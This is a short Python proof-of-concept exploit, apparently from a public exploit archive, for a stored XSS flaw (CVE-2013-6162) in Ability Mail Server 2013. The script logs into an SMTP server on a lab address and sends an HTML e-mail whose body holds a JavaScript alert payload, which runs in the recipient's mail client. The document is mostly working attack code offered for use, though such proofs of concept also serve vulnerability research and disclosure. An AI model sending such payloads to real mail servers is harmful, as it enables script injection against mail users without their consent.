#!/usr/bin/env python
 
'''
Exploit Title: Ability Mail Server 2013 Stored XSS
Date: 12/20/2013
Exploit Author: David Um
Vendor Homepage: http://www.code-crafters.com/
Software Link: http://download.code-crafters.com/ams.exe
Version: 3.1.1
Tested on: Windows Server 2003 SP2
CVE : CVE-2013-6162
Description: This proof of concept demonstrates a stored XSS 
vulnerability in e-mail clients
when JavaScript is inserted into the body of an e-mail.
'''
 
import smtplib
 
email_addr = 'user@hack.local'
 
email = 'From: %s\n' % email_addr
email += 'To: %s\n' % email_addr
email += 'Subject: XSS\n'
email += 'Content-type: text/html\n\n'
email += '<script>alert("XSS")</script>'
s = smtplib.SMTP('192.168.58.140', 25)
 
s.login(email_addr, "user")
s.sendmail(email_addr, email_addr, email)
s.quit()
